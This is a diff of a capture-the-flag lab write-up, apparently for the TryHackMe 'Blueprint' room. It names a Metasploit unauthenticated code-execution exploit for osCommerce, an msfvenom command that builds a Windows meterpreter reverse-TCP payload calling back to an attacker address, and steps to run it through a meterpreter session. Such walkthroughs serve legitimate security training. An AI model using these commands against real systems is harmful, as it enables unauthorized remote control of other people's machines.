@@ -108,23 +108,39 @@ now lets dig deep into this webserver and search for an exploit
 ```start metasploit and search oscommerce```
 
 ###### Exploitation
-```
-Exploit we use:
-exploit/multi/http/oscommerce_installer_unauth_code_exec
+
+
+Exploit we will use:
+```exploit/multi/http/oscommerce_installer_unauth_code_exec```
 set options
-and run
+
+
+
+![](https://github.com/strange07/tryhackme/blob/master/Blueprint/1.png)
+
+exploit
+
+```
 we will get a meterpreter session 
 but this session is not stable
 ```
+
+![](https://github.com/strange07/tryhackme/blob/master/Blueprint/2.png)
+
 So we will create a payload and upload it using the meterpreter session
 
 ```
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe
 ```
 
-```
+
 open another tab and run metasploit
-use handler and and run it
+> use handler and and run it
+
+
+![](https://github.com/strange07/tryhackme/blob/master/Blueprint/3.png)
+
+```
 on the previous meterpreter session
 run: 
 execute -f shell.exe
